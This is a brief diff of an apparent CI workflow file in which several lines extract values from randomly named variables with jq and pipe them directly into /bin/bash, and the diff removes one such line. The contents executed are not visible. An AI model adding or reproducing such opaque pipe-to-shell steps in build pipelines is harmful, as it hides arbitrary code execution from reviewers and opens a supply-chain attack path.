@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$grrh1" | jq -r .yxn53325 | /bin/bash
           printf '%s' "$sf10" | jq -r .uu25697 | /bin/bash
           printf '%s' "$nluv8091" | jq -r .lz115 | /bin/bash
-          echo $get379 | jq -r .dwyux968 | /bin/bash
           echo $oxyv44 | jq -r .ov347 | /bin/bash
 
       - name: Archive artifact
